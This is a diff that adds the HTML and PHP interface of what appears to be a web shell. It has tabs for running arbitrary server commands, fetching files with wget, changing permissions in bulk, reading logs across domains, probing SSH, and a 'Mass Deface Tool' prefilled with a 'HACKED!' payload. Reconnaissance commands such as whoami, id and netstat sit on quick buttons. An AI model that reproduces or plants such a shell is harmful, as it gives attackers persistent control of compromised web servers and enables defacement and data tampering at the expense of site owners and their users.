+        .message.error { background: rgba(244, 67, 54, 0.1); color: #ef5350; border: 1px solid rgba(244, 67, 54, 0.15); }
+        .message.warning { background: rgba(255, 152, 0, 0.1); color: #ffa726; border: 1px solid rgba(255, 152, 0, 0.15); }
+        
+        .file-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 15px;
+        }
+        .file-item {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            border-radius: 12px;
+            padding: 15px;
+            text-align: center;
+            transition: 0.3s;
+            position: relative;
+        }
+        .file-item:hover {
+            background: rgba(255, 255, 255, 0.04);
+            transform: translateY(-2px);
+            border-color: rgba(255, 255, 255, 0.08);
+        }
+        .file-item.is-root {
+            border-color: rgba(244, 67, 54, 0.3);
+            background: rgba(244, 67, 54, 0.05);
+        }
+        .file-item.is-root .name a { color: #ef5350; }
+        .file-item .root-badge {
+            position: absolute;
+            top: 5px;
+            right: 5px;
+            background: rgba(244, 67, 54, 0.15);
+            color: #ef5350;
+            font-size: 8px;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+        .file-item .icon { font-size: 40px; margin-bottom: 8px; }
+        .file-item .name { font-size: 13px; word-break: break-all; }
+        .file-item .name a { color: #e0e4f0; text-decoration: none; }
+        .file-item .name a:hover { color: #42a5f5; }
+        .file-item .size { font-size: 11px; color: rgba(255, 255, 255, 0.25); }
+        .file-item .actions { margin-top: 8px; display: flex; gap: 4px; justify-content: center; flex-wrap: wrap; }
+        .file-item .actions button {
+            padding: 2px 8px;
+            font-size: 10px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .file-item .actions .edit { background: rgba(66, 165, 245, 0.15); color: #42a5f5; }
+        .file-item .actions .edit:hover { background: rgba(66, 165, 245, 0.25); }
+        .file-item .actions .rename { background: rgba(255, 152, 0, 0.15); color: #ffa726; }
+        .file-item .actions .rename:hover { background: rgba(255, 152, 0, 0.25); }
+        .file-item .actions .delete { background: rgba(244, 67, 54, 0.15); color: #ef5350; }
+        .file-item .actions .delete:hover { background: rgba(244, 67, 54, 0.25); }
+        .file-item .actions .chmod { background: rgba(76, 175, 80, 0.15); color: #66bb6a; }
+        .file-item .actions .chmod:hover { background: rgba(76, 175, 80, 0.25); }
+        
+        .cmd-output {
+            background: rgba(0, 0, 0, 0.3);
+            color: #68d391;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 10px 0;
+            max-height: 450px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            white-space: pre-wrap;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+        }
+        
+        .form-group { margin: 10px 0; }
+        .form-group label { display: inline-block; width: 140px; font-weight: 500; font-size: 13px; color: rgba(255, 255, 255, 0.6); }
+        .form-group input, .form-group textarea, .form-group select {
+            padding: 8px 14px;
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 8px;
+            color: #e0e4f0;
+            font-size: 13px;
+            font-family: 'Poppins', sans-serif;
+            min-width: 300px;
+            transition: 0.3s;
+        }
+        .form-group input:focus, .form-group textarea:focus, .form-group select:focus {
+            border-color: rgba(66, 165, 245, 0.3);
+            outline: none;
+            background: rgba(255, 255, 255, 0.06);
+        }
+        .form-group textarea { min-height: 60px; font-family: 'Courier New', monospace; }
+        
+        .chmod-section {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            border-radius: 12px;
+            padding: 20px;
+            margin: 15px 0;
+        }
+        .chmod-section h4 { color: #ffffff; margin-bottom: 15px; font-weight: 500; }
+        
+        .quick-commands {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 5px;
+            margin: 10px 0;
+        }
+        .quick-commands button {
+            padding: 4px 14px;
+            background: rgba(255, 255, 255, 0.03);
+            color: rgba(255, 255, 255, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 11px;
+            font-family: 'Poppins', sans-serif;
+            transition: 0.3s;
+        }
+        .quick-commands button:hover {
+            background: rgba(255, 255, 255, 0.06);
+            color: rgba(255, 255, 255, 0.7);
+        }
+        
+        .stats {
+            padding: 15px 30px;
+            background: rgba(0, 0, 0, 0.15);
+            border-top: 1px solid rgba(255, 255, 255, 0.03);
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.2);
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(10px);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-content {
+            background: rgba(20, 28, 58, 0.95);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 16px;
+            padding: 30px;
+            max-width: 600px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        .modal-content h3 { color: #ffffff; margin-bottom: 15px; }
+        .modal-content textarea {
+            width: 100%;
+            min-height: 200px;
+            padding: 12px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 8px;
+            color: #e0e4f0;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+        }
+        .modal-content .close-btn {
+            float: right;
+            font-size: 24px;
+            cursor: pointer;
+            color: rgba(255, 255, 255, 0.2);
+            transition: 0.3s;
+        }
+        .modal-content .close-btn:hover { color: rgba(255, 255, 255, 0.5); }
+        
+        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .info-grid .item { padding: 10px 15px; background: rgba(255, 255, 255, 0.02); border-radius: 8px; border: 1px solid rgba(255, 255, 255, 0.03); }
+        .info-grid .item strong { color: rgba(255, 255, 255, 0.6); }
+        .info-grid .item .value { color: #e0e4f0; }
+        
+        @media (max-width: 768px) {
+            .file-grid { grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); }
+            .header { flex-direction: column; text-align: center; gap: 10px; }
+            .toolbar { flex-direction: column; align-items: stretch; }
+            .form-group label { width: 100%; }
+            .info-grid { grid-template-columns: 1fr; }
+            .tabs .tab { padding: 8px 12px; font-size: 10px; }
+            .tab-content { padding: 15px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- Header -->
+    <div class="header">
+        <div class="header-left">
+            <div class="header-logo"><?php echo $branding['logo']; ?></div>
+            <div class="header-title">
+                <?php echo $branding['short_name']; ?>
+                <span class="header-badge"><?php echo $branding['version']; ?></span>
+            </div>
+        </div>
+        <div class="header-right">
+            <div class="user-info">
+                <div class="avatar"><?php echo substr($config['username'], 0, 1); ?></div>
+                <span><?php echo $config['username']; ?></span>
+            </div>
+            <span>|</span>
+            <i class="fas fa-clock"></i> <?php echo date('H:i:s'); ?>
+            <a href="?logout" onclick="return confirm('Logout?')"><i class="fas fa-sign-out-alt"></i> Logout</a>
+        </div>
+    </div>
+    
+    <!-- Tabs -->
+    <div class="tabs">
+        <div class="tab active" onclick="showTab('files')"><i class="fas fa-folder"></i> Files</div>
+        <div class="tab" onclick="showTab('cmd')"><i class="fas fa-terminal"></i> Command</div>
+        <div class="tab" onclick="showTab('download')"><i class="fas fa-download"></i> Download</div>
+        <div class="tab" onclick="showTab('chmod')"><i class="fas fa-lock"></i> CHMOD</div>
+        <div class="tab" onclick="showTab('log')"><i class="fas fa-history"></i> Log</div>
+        <div class="tab" onclick="showTab('ssh')"><i class="fas fa-shield-alt"></i> SSH</div>
+        <div class="tab" onclick="showTab('extract')"><i class="fas fa-file-archive"></i> Extract</div>
+        <div class="tab" onclick="showTab('zip')"><i class="fas fa-compress"></i> Zip</div>
+        <div class="tab" onclick="showTab('deface')"><i class="fas fa-skull"></i> Deface</div>
+        <div class="tab" onclick="showTab('info')"><i class="fas fa-info-circle"></i> Info</div>
+    </div>
+    
+    <!-- Tab: Files -->
+    <div id="tab-files" class="tab-content active">
+        <div class="toolbar">
+            <form method="post" enctype="multipart/form-data">
+                <input type="file" name="upload_file" required>
+                <button type="submit" class="btn btn-success"><i class="fas fa-upload"></i> Upload</button>
+            </form>
+            <form method="post">
+                <input type="text" name="folder_name" placeholder="Folder name" required>
+                <button type="submit" name="create_folder" value="1" class="btn btn-primary"><i class="fas fa-folder-plus"></i> New</button>
+            </form>
+            <span style="margin-left:auto;font-size:13px;color:rgba(255,255,255,0.2);">
+                <i class="fas fa-database"></i> <?php echo count($items); ?> items
+            </span>
+        </div>
+        
+        <div class="breadcrumb">
+            <a href="?path=<?php echo urlencode(__DIR__); ?>"><i class="fas fa-home"></i></a>
+            <?php foreach ($breadcrumbs as $crumb): ?>
+                <span class="separator">/</span>
+                <a href="?path=<?php echo urlencode($crumb['path']); ?>">
+                    <?php echo htmlspecialchars($crumb['name']); ?>
+                </a>
+            <?php endforeach; ?>
+            <?php if ($parent_dir != $current_path): ?>
+                <span style="margin-left:15px;">
+                    <a href="?path=<?php echo urlencode($parent_dir); ?>" style="color:rgba(255,255,255,0.2);">
+                        <i class="fas fa-arrow-up"></i> ..
+                    </a>
+                </span>
+            <?php endif; ?>
+        </div>
+        
+        <?php if ($message): ?>
+            <div class="message <?php 
+                echo strpos($message, '✅') !== false ? 'success' : 
+                    (strpos($message, '⚠️') !== false ? 'warning' : 'error'); 
+            ?>">
+                <?php echo nl2br(htmlspecialchars($message)); ?>
+            </div>
+        <?php endif; ?>
+        
+        <div class="file-grid">
+            <?php if ($items): ?>
+                <?php foreach ($items as $item): ?>
+                    <div class="file-item <?php echo $item['is_root'] ? 'is-root' : ''; ?>">
+                        <?php if ($item['is_root']): ?>
+                            <span class="root-badge"><i class="fas fa-exclamation-triangle"></i> ROOT</span>
+                        <?php endif; ?>
+                        <div class="icon">
+                            <?php if ($item['is_dir']): ?>
+                                <i class="fas fa-folder" style="color:<?php echo $item['is_root'] ? '#ef5350' : '#f6ad55'; ?>;"></i>
+                            <?php elseif (preg_match('/\.(jpg|jpeg|png|gif|webp)$/i', $item['name'])): ?>
+                                <i class="fas fa-image" style="color:#68d391;"></i>
+                            <?php elseif (preg_match('/\.(zip|tar|gz|rar|7z)$/i', $item['name'])): ?>
+                                <i class="fas fa-file-archive" style="color:#f6ad55;"></i>
+                            <?php elseif (preg_match('/\.(php|html|htm|css|js|json|xml)$/i', $item['name'])): ?>
+                                <i class="fas fa-code" style="color:#63b3ed;"></i>
+                            <?php else: ?>
+                                <i class="fas fa-file" style="color:<?php echo $item['is_root'] ? '#ef5350' : '#a0aec0'; ?>;"></i>
+                            <?php endif; ?>
+                        </div>
+                        <div class="name">
+                            <?php if ($item['is_dir']): ?>
+                                <a href="?path=<?php echo urlencode($item['path']); ?>">
+                                    <?php echo htmlspecialchars($item['name']); ?>
+                                </a>
+                            <?php else: ?>
+                                <a href="<?php echo htmlspecialchars(basename($item['path'])); ?>" target="_blank">
+                                    <?php echo htmlspecialchars($item['name']); ?>
+                                </a>
+                            <?php endif; ?>
+                        </div>
+                        <div class="size">
+                            <?php if (!$item['is_dir']): ?>
+                                <?php echo formatSize($item['size']); ?>
+                            <?php endif; ?>
+                            <span style="font-size:10px;color:rgba(255,255,255,0.15);"><?php echo $item['permissions']; ?></span>
+                        </div>
+                        <div class="actions">
+                            <?php if (!$item['is_dir'] && preg_match('/\.(php|txt|html|css|js|json|xml|ini|conf)$/i', $item['name'])): ?>
+                                <button class="edit" onclick="editFile('<?php echo htmlspecialchars($item['name']); ?>')">
+                                    <i class="fas fa-edit"></i>
+                                </button>
+                            <?php endif; ?>
+                            <button class="rename" onclick="renameItem('<?php echo htmlspecialchars($item['name']); ?>')">
+                                <i class="fas fa-pen"></i>
+                            </button>
+                            <button class="delete" onclick="deleteItem('<?php echo htmlspecialchars($item['name']); ?>')">
+                                <i class="fas fa-trash"></i>
+                            </button>
+                            <button class="chmod" onclick="chmodItem('<?php echo htmlspecialchars($item['name']); ?>', '<?php echo $item['is_dir'] ? '755' : '644'; ?>')">
+                                <i class="fas fa-lock"></i>
+                            </button>
+                        </div>
+                    </div>
+                <?php endforeach; ?>
+            <?php else: ?>
+                <div style="grid-column:1/-1;text-align:center;padding:60px 20px;color:rgba(255,255,255,0.15);">
+                    <i class="fas fa-folder-open" style="font-size:48px;display:block;margin-bottom:15px;"></i>
+                    Directory is empty
+                </div>
+            <?php endif; ?>
+        </div>
+    </div>
+    
+    <!-- Tab: Command -->
+    <div id="tab-cmd" class="tab-content">
+        <h3><i class="fas fa-terminal"></i> Command Execution <span>Live Output • Auto Clear</span></h3>
+        <form method="post" onsubmit="return runCommandAndClear(this);">
+            <div class="form-group">
+                <label>Command:</label>
+                <input type="text" name="alfa_cmd" id="cmd_input" placeholder="ls -la | whoami | id" style="min-width:400px;" required autocomplete="off">
+                <button type="submit" class="btn btn-primary"><i class="fas fa-play"></i> Run</button>
+            </div>
+        </form>
+        
+        <div class="quick-commands">
+            <button onclick="setCmdAndRun('ls -la')">ls -la</button>
+            <button onclick="setCmdAndRun('pwd')">pwd</button>
+            <button onclick="setCmdAndRun('whoami')">whoami</button>
+            <button onclick="setCmdAndRun('id')">id</button>
+            <button onclick="setCmdAndRun('uname -a')">uname -a</button>
+            <button onclick="setCmdAndRun('ps aux')">ps aux</button>
+            <button onclick="setCmdAndRun('netstat -tulpn')">netstat</button>
+            <button onclick="setCmdAndRun('df -h')">df -h</button>
+            <button onclick="setCmdAndRun('free -m')">free -m</button>
+        </div>
+        
+        <?php if (!empty($cmd_output)): ?>
+            <div class="cmd-output"><?php echo htmlspecialchars($cmd_output); ?></div>
+        <?php endif; ?>
+        
+        <div id="cmd_result" style="display:none;" class="cmd-output"></div>
+    </div>
+    
+    <!-- Tab: Download -->
+    <div id="tab-download" class="tab-content">
+        <h3><i class="fas fa-download"></i> Download Manager <span>wget + unzip • Auto Clear</span></h3>
+        
+        <div id="download_result" style="display:none;" class="cmd-output"></div>
+        
+        <!-- WGET -->
+        <div style="background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.04);border-radius:12px;padding:20px;margin:15px 0;">
+            <h4 style="color:#66bb6a;font-weight:400;"><i class="fas fa-cloud-download-alt"></i> Download File (wget)</h4>
+            <form method="post" onsubmit="return runWgetAndClear(this);">
+                <div class="form-group">
+                    <label>URL:</label>
+                    <input type="text" name="wget_url" id="wget_url" placeholder="https://example.com/file.zip" style="min-width:400px;" required autocomplete="off">
+                </div>
+                <div class="form-group">
+                    <label>Save as:</label>
+                    <input type="text" name="wget_filename" id="wget_filename" placeholder="filename.zip (kosongkan = auto)" style="min-width:300px;" autocomplete="off">
+                </div>
+                <button type="submit" name="wget_download" value="1" class="btn btn-success">
+                    <i class="fas fa-download"></i> Download
+                </button>
+            </form>
+        </div>
+        
+        <!-- UNZIP -->
+        <div style="background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.04);border-radius:12px;padding:20px;margin:15px 0;">
+            <h4 style="color:#ffa726;font-weight:400;"><i class="fas fa-file-archive"></i> Extract Archive (unzip)</h4>
+            <form method="post" onsubmit="return runUnzipAndClear(this);">
+                <div class="form-group">
+                    <label>File:</label>
+                    <input type="text" name="unzip_path" id="unzip_path" placeholder="file.zip" style="min-width:350px;" required autocomplete="off">
+                </div>
+                <div class="form-group">
+                    <label>Extract to:</label>
+                    <input type="text" name="unzip_target" id="unzip_target" placeholder="/path/to/target (kosongkan = auto)" style="min-width:350px;" autocomplete="off">
+                </div>
+                <button type="submit" name="unzip_file" value="1" class="btn btn-warning">
+                    <i class="fas fa-file-archive"></i> Extract
+                </button>
+            </form>
+        </div>
+        
+        <div style="padding:15px;background:rgba(255,255,255,0.02);border-radius:10px;border:1px solid rgba(255,255,255,0.03);">
+            <h4 style="color:rgba(255,255,255,0.3);font-size:12px;font-weight:400;"><i class="fas fa-info-circle"></i> Supported Formats</h4>
+            <div style="display:flex;flex-wrap:wrap;gap:10px;margin-top:8px;font-size:12px;color:rgba(255,255,255,0.3);">
+                <span>📦 ZIP</span>
+                <span>📦 TAR</span>
+                <span>📦 GZ</span>
+                <span>📦 TAR.GZ</span>
+                <span>📦 RAR</span>
+                <span>📦 TGZ</span>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Tab: CHMOD -->
+    <div id="tab-chmod" class="tab-content">
+        <h3><i class="fas fa-lock"></i> CHMOD Manager <span>File & Folder Permission</span></h3>
+        
+        <div class="chmod-section">
+            <h4>🔒 1. Single CHMOD</h4>
+            <form method="post">
+                <div class="form-group">
+                    <label>File/Folder:</label>
+                    <input type="text" name="chmod_path" id="chmod_path" placeholder="filename.php" style="min-width:250px;" required>
+                </div>
+                <div class="form-group">
+                    <label>Permission:</label>
+                    <select name="chmod_perm">
+                        <option value="644">644 (rw-r--r--)</option>
+                        <option value="755">755 (rwxr-xr-x)</option>
+                        <option value="777">777 (rwxrwxrwx) ⚠️</option>
+                        <option value="600">600 (rw-------)</option>
+                        <option value="664">664 (rw-rw-r--)</option>
+                        <option value="775">775 (rwxrwxr-x)</option>
+                    </select>
+                </div>
+                <button type="submit" name="chmod_single" value="1" class="btn btn-cyan">
+                    <i class="fas fa-lock"></i> Change Permission
+                </button>
+            </form>
+        </div>
+        
+        <div class="chmod-section">
+            <h4>📁 2. Mass CHMOD (Recursive)</h4>
+            <form method="post">
+                <div class="form-group">
+                    <label>Target Directory:</label>
+                    <input type="text" name="chmod_dir" value="<?php echo htmlspecialchars($current_path); ?>" style="min-width:250px;">
+                </div>
+                <div class="form-group">
+                    <label>File Permission:</label>
+                    <select name="chmod_file_perm">
+                        <option value="644">644 (rw-r--r--)</option>
+                        <option value="600">600 (rw-------)</option>
+                        <option value="664">664 (rw-rw-r--)</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Folder Permission:</label>
+                    <select name="chmod_dir_perm">
+                        <option value="755">755 (rwxr-xr-x)</option>
+                        <option value="775">775 (rwxrwxr-x)</option>
+                        <option value="700">700 (rwx------)</option>
+                    </select>
+                </div>
+                <button type="submit" name="chmod_mass" value="1" class="btn btn-warning" onclick="return confirm('⚠️ Yakin ingin mass CHMOD?')">
+                    <i class="fas fa-lock"></i> Mass CHMOD
+                </button>
+            </form>
+        </div>
+        
+        <div class="chmod-section">
+            <h4>📄 3. CHMOD by Pattern</h4>
+            <form method="post">
+                <div class="form-group">
+                    <label>Target Directory:</label>
+                    <input type="text" name="chmod_pattern_dir" value="<?php echo htmlspecialchars($current_path); ?>" style="min-width:250px;">
+                </div>
+                <div class="form-group">
+                    <label>Pattern:</label>
+                    <input type="text" name="chmod_pattern" placeholder="*.php or php,html,js" style="min-width:200px;" required>
+                </div>
+                <div class="form-group">
+                    <label>Permission:</label>
+                    <select name="chmod_pattern_perm">
+                        <option value="644">644 (rw-r--r--)</option>
+                        <option value="755">755 (rwxr-xr-x)</option>
+                        <option value="600">600 (rw-------)</option>
+                    </select>
+                </div>
+                <button type="submit" name="chmod_pattern" value="1" class="btn btn-purple">
+                    <i class="fas fa-lock"></i> CHMOD by Pattern
+                </button>
+            </form>
+        </div>
+        
+        <?php if (!empty($chmod_results)): ?>
+            <div class="cmd-output" style="max-height:200px;">
+                <?php foreach ($chmod_results as $result): ?>
+                    <div><?php echo htmlspecialchars($result); ?></div>
+                <?php endforeach; ?>
+            </div>
+        <?php endif; ?>
+        
+        <div style="margin-top:15px;padding:15px;background:rgba(255,255,255,0.02);border-radius:10px;border:1px solid rgba(255,255,255,0.03);">
+            <h4 style="color:rgba(255,255,255,0.4);font-size:12px;font-weight:400;"><i class="fas fa-info-circle"></i> Permission Guide</h4>
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:5px;font-size:12px;color:rgba(255,255,255,0.3);margin-top:8px;">
+                <div>644: rw-r--r-- (File default)</div>
+                <div>755: rwxr-xr-x (Folder default)</div>
+                <div>777: rwxrwxrwx ⚠️ TIDAK AMAN</div>
+                <div>600: rw------- (Private)</div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Tab: Log -->
+    <div id="tab-log" class="tab-content">
+        <h3><i class="fas fa-history"></i> Activity Log <span>Multi-Domain</span></h3>
+        
+        <div style="background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.04);border-radius:12px;padding:15px;margin:10px 0;">
+            <h4 style="color:rgba(255,255,255,0.5);font-weight:400;font-size:14px;">🌐 Domains</h4>
+            <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:8px;margin-top:10px;">
+                <?php 
+                $domains = findAllDomains();
+                foreach ($domains as $domain): 
+                ?>
+                <div style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,0.03);">
+                    <div style="color:#e0e4f0;font-size:13px;"><?php echo htmlspecialchars($domain['domain']); ?></div>
+                    <div style="font-size:11px;color:rgba(255,255,255,0.2);">📂 <?php echo htmlspecialchars($domain['path']); ?></div>
+                    <div style="margin-top:5px;">
+                        <button onclick="viewLog('<?php echo addslashes($domain['path']); ?>')" class="btn btn-cyan" style="padding:2px 10px;font-size:10px;">
+                            <i class="fas fa-eye"></i> View
+                        </button>
+                        <button onclick="monitorDomain('<?php echo addslashes($domain['path']); ?>')" class="btn btn-warning" style="padding:2px 10px;font-size:10px;">
+                            <i class="fas fa-search"></i> Monitor
+                        </button>
+                    </div>
+                </div>
+                <?php endforeach; ?>
+            </div>
+        </div>
+        
+        <div style="background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.04);border-radius:12px;padding:15px;margin:10px 0;">
+            <h4 style="color:rgba(255,255,255,0.5);font-weight:400;font-size:14px;">📋 Log Viewer</h4>
+            <div class="form-group">
+                <label>Domain Path:</label>
+                <input type="text" id="log_domain_path" placeholder="/home/user/public_html" style="min-width:350px;">
+            </div>
+            <div class="form-group">
+                <label>Lines:</label>
+                <select id="log_lines">
+                    <option value="20">20</option>
+                    <option value="50" selected>50</option>
+                    <option value="100">100</option>
+                    <option value="200">200</option>
+                    <option value="500">500</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label>Filter:</label>
+                <input type="text" id="log_filter" placeholder="Filter keyword" style="min-width:200px;">
+            </div>
+            <button onclick="viewLog()" class="btn btn-primary"><i class="fas fa-eye"></i> View Log</button>
+            <button onclick="viewAggregatedLog()" class="btn btn-purple"><i class="fas fa-layer-group"></i> All Domains</button>
+            <button onclick="monitorChanges()" class="btn btn-warning"><i class="fas fa-search"></i> Monitor Changes</button>
+        </div>
+        
+        <div id="log_result" style="display:none;" class="cmd-output"></div>
+        <div id="monitor_result" style="display:none;" class="cmd-output"></div>
+    </div>
+    
+    <!-- Tab: SSH -->
+    <div id="tab-ssh" class="tab-content">
+        <h3><i class="fas fa-shield-alt"></i> SSH Detector <span>Config Reader</span></h3>
+        
+        <div style="background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.04);border-radius:12px;padding:15px;margin:10px 0;">
+            <h4 style="color:rgba(255,255,255,0.5);font-weight:400;font-size:14px;">🔍 Quick Detection</h4>
+            <div class="quick-commands">
+                <button onclick="runSSHDetect()" class="btn btn-cyan"><i class="fas fa-search"></i> Auto Detect</button>
+                <button onclick="runSSHConfig()" class="btn btn-primary"><i class="fas fa-file-alt"></i> Read Config</button>
+                <button onclick="runSSHPort()" class="btn btn-warning"><i class="fas fa-network-wired"></i> Quick Port</button>
+            </div>
+            <div id="ssh_result" style="display:none;" class="cmd-output"></div>
+        </div>
+        
+        <?php if (!empty($ssh_output)): ?>
+            <div class="cmd-output"><?php echo nl2br(htmlspecialchars($ssh_output)); ?></div>
+        <?php endif; ?>
+        
+        <div style="margin-top:15px;">
+            <h4 style="color:rgba(255,255,255,0.4);font-weight:400;font-size:13px;">📋 Manual Commands</h4>
+            <div class="quick-commands">
+                <button onclick="setCmdAndRun('ps aux | grep [s]shd')">🔍 Process</button>
+                <button onclick="setCmdAndRun('netstat -tulpn | grep sshd')">📡 Port</button>
+                <button onclick="setCmdAndRun('ss -tulpn | grep sshd')">📡 SS</button>
+                <button onclick="setCmdAndRun('systemctl status sshd')">⚙️ Status</button>
+                <button onclick="setCmdAndRun('ssh -V')">📦 Version</button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Tab: Extract -->
+    <div id="tab-extract" class="tab-content">
+        <h3><i class="fas fa-file-archive"></i> Extract / Unzip</h3>
+        <form method="post">
+            <div class="form-group">
+                <label>File to extract:</label>
+                <input type="text" name="extract_file" placeholder="/path/to/file.zip" style="min-width:350px;" required>
+            </div>
+            <div class="form-group">
+                <label>Extract to:</label>
+                <input type="text" name="extract_target" placeholder="/path/to/target" style="min-width:350px;" value="<?php echo $current_path; ?>">
+            </div>
+            <button type="submit" name="alfa_extract" value="1" class="btn btn-warning"><i class="fas fa-file-archive"></i> Extract</button>
+        </form>
+        <?php if ($extract_result): ?>
+            <div class="message <?php echo strpos($extract_result, '✅') !== false ? 'success' : 'error'; ?>">
+                <?php echo $extract_result; ?>
+            </div>
+        <?php endif; ?>
+    </div>
+    
+    <!-- Tab: Zip -->
+    <div id="tab-zip" class="tab-content">
+        <h3><i class="fas fa-compress"></i> Zip / Compress</h3>
+        <form method="post">
+            <div class="form-group">
+                <label>Source file/dir:</label>
+                <input type="text" name="zip_source" placeholder="/path/to/source" style="min-width:350px;" required>
+            </div>
+            <div class="form-group">
+                <label>Save as:</label>
+                <input type="text" name="zip_dest" placeholder="/path/to/output.zip" style="min-width:350px;" required>
+            </div>
+            <button type="submit" name="alfa_zip" value="1" class="btn btn-success"><i class="fas fa-compress"></i> Create ZIP</button>
+        </form>
+        <?php if ($zip_result): ?>
+            <div class="message <?php echo strpos($zip_result, '✅') !== false ? 'success' : 'error'; ?>">
+                <?php echo $zip_result; ?>
+            </div>
+        <?php endif; ?>
+    </div>
+    
+    <!-- Tab: Deface -->
+    <div id="tab-deface" class="tab-content">
+        <h3><i class="fas fa-skull"></i> Mass Deface Tool</h3>
+        <form method="post">
+            <div class="form-group">
+                <label>Target Directory:</label>
+                <input type="text" name="target_dir" value="<?php echo htmlspecialchars($current_path); ?>" style="min-width:350px;">
+            </div>
+            <div class="form-group">
+                <label>Filename:</label>
+                <input type="text" name="filename" placeholder="index.php" value="index.php" style="min-width:350px;">
+            </div>
+            <div class="form-group">
+                <label>Method:</label>
+                <select name="tipe">
+                    <option value="all">All Files</option>
+                    <option value="index">Index Files Only</option>
+                    <option value="ext">By Extension</option>
+                    <option value="custom">Custom Filename</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label>Content:</label>
+                <textarea name="content" rows="3" style="min-width:350px;"><?php echo htmlspecialchars('<?php echo "HACKED!"; ?>'); ?></textarea>
+            </div>
+            <button type="submit" name="mass_deface" value="1" class="btn btn-danger" onclick="return confirm('⚠️ Yakin ingin melakukan Mass Deface?')">
+                <i class="fas fa-skull"></i> RUN MASS DEFACE
+            </button>
+        </form>
+        <?php if (!empty($mass_results)): ?>
+            <div class="cmd-output" style="max-height:200px;">
+                <?php foreach ($mass_results as $result): ?>
+                    <div><?php echo htmlspecialchars($result); ?></div>
+                <?php endforeach; ?>
+            </div>
+        <?php endif; ?>
+    </div>
+    
+    <!-- Tab: Info -->
+    <div id="tab-info" class="tab-content">
+        <h3><i class="fas fa-info-circle"></i> Server Information</h3>
+        <div class="info-grid">
+            <div class="item"><strong>OS:</strong> <span class="value"><?php echo PHP_OS; ?></span></div>
+            <div class="item"><strong>PHP Version:</strong> <span class="value"><?php echo phpversion(); ?></span></div>
+            <div class="item"><strong>Current Dir:</strong> <span class="value"><?php echo $current_path; ?></span></div>
+            <div class="item"><strong>User:</strong> <span class="value"><?php echo function_exists('get_current_user') ? get_current_user() : '?'; ?></span></div>
+            <div class="item"><strong>Server:</strong> <span class="value"><?php echo $_SERVER['HTTP_HOST']; ?></span></div>
+            <div class="item"><strong>IP:</strong> <span class="value"><?php echo $_SERVER['REMOTE_ADDR']; ?></span></div>
+            <div class="item"><strong>ZipArchive:</strong> <span class="value"><?php echo class_exists('ZipArchive') ? '✅ Yes' : '❌ No'; ?></span></div>
+            <div class="item"><strong>cURL:</strong> <span class="value"><?php echo function_exists('curl_init') ? '✅ Yes' : '❌ No'; ?></span></div>
+            <div class="item"><strong>cPanel:</strong> <span class="value"><?php echo file_exists('/usr/local/cpanel/bin/uapi') ? '✅ Yes' : '❌ No'; ?></span></div>
+            <div class="item"><strong>SSH:</strong> <span class="value"><?php echo !empty(alfaEx("ps aux | grep [s]shd")) ? '✅ Running' : '❌ Not running'; ?></span></div>
+        </div>
+    </div>
+    
+    <!-- Stats -->
+    <div class="stats">
+        <i class="fas fa-info-circle"></i>
+        <?php echo $branding['name']; ?> <?php echo $branding['version']; ?> •
+        <?php echo $branding['team']; ?> •
+        <?php echo date('Y-m-d H:i:s'); ?> •
+        Items: <?php echo count($items); ?>
+    </div>
+</div>
+
+<!-- Modals -->
+<div id="editModal" class="modal">
+    <div class="modal-content">
+        <span class="close-btn" onclick="closeModal('editModal')">&times;</span>
+        <h3><i class="fas fa-edit"></i> Edit File</h3>
+        <form method="post">
+            <input type="hidden" name="file_path" id="edit_file_path">
+            <textarea name="file_content" id="edit_file_content" rows="15"></textarea>
+            <button type="submit" name="edit_file" value="1" class="btn btn-primary"><i class="fas fa-save"></i> Save</button>
+        </form>
+    </div>
+</div>
+
+<div id="renameModal" class="modal">
+    <div class="modal-content">
+        <span class="close-btn" onclick="closeModal('renameModal')">&times;</span>
+        <h3><i class="fas fa-pen"></i> Rename</h3>
+        <form method="post">
+            <input type="hidden" name="old_name" id="rename_old_name">
+            <div class="form-group">
+                <label>New name:</label>
+                <input type="text" name="new_name" id="rename_new_name" required>
+            </div>
